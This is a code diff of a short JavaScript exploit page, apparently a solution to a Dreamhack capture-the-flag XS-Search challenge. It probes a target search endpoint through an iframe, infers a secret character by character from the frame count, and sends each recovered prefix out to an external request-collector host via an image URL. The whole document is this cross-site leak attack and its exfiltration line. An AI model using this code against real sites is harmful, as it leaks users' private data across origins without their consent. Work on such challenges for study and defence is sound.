@@ -3,25 +3,20 @@
 <script>
     async function req(url) {
         return await new Promise((resolve, reject) => {
-            var iframe = document.getElementById("iframe");
+            const iframe = document.getElementById("iframe");
             iframe.src = url;
-            document.body.appendChild(iframe);
-
-            iframe.onload = function() {
-                var status = iframe.contentWindow.document.readyState;
-                console.log("Status code:", status);
-                if (status == 404) {
-                    return reject();
-                } else {
+            iframe.onload = () => { 
+                if (iframe.contentWindow.frames.length != 0)
                     return resolve();
-                }
-            };    
+                else
+                    return reject();
+            };
         });
     }
     async function search(query) {
         try {
             await req(
-              `https://localhost:8000/search?keyword=${query}`
+              `https://localhost:8000/search?query=${query}`
             );
             return true;
         } catch (e) {
@@ -35,7 +30,7 @@
             for (let c of chars) {
                 if (await search(secret + c)) {
                     secret += c;
-                    img.src = `https://enmexkr.request.dreamhack.games/${secret}`;
+                    img.src = `https://otqvuek.request.dreamhack.games/${secret}`;
                     break;
                 }
             }
